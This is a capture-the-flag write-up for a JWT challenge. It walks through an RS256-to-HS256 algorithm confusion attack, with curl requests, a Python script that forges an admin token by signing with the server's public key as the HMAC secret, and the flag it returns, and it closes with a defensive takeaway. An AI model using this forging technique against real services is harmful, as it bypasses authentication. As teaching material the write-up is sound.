---
title: "Broken JWT: Algorithm Confusion Attack"
date: 2024-10-18
description: "Forge an admin JWT by exploiting RS256-to-HS256 algorithm confusion using the server's public key as HMAC secret."
category: "Web Exploitation"
ctf: "ISFCR CryoVault Quals"
difficulty: "Hard"
points: 500
tags: ["jwt", "algorithm-confusion", "rsa", "hmac", "python"]
---

## Challenge Overview

Login as `guest`, get a JWT, become `admin`. The server accepted RS256 tokens — and conveniently exposed its public key at `/api/pubkey`.

## Solution

### Step 1: Fetch the public key

```bash
$ curl https://cryo.isfcr.ctf/api/pubkey
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
```

### Step 2: Login and decode the JWT

```bash
$ curl -X POST /api/login -d '{"user":"guest","pass":"guest"}'
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

Decoded payload: `{"user": "guest", "role": "viewer", "iat": 1729123456}`

### Step 3: Forge HS256 token using the public key as secret

```python
import jwt, base64

pub_key = open('pubkey.pem').read()

payload = {"user": "admin", "role": "admin", "iat": 1729123456}

# Sign with HS256 using the PEM-encoded public key as the HMAC secret
forged = jwt.encode(payload, pub_key, algorithm='HS256')
print(forged)
```

### Step 4: Access admin endpoint

```bash
$ curl -H "Authorization: Bearer <forged_token>" /api/admin/flag
{"flag": "FLAG{4lg0_c0nfus10n_jwt_pwn3d}"}
```

## Flag

`FLAG{4lg0_c0nfus10n_jwt_pwn3d}`

## Key Takeaways

If a server verifies tokens with `jwt.verify(token, key)` without enforcing the algorithm, an attacker can switch to HS256 and use the server's known public key as the HMAC secret. Always validate `alg` server-side before processing the signature.
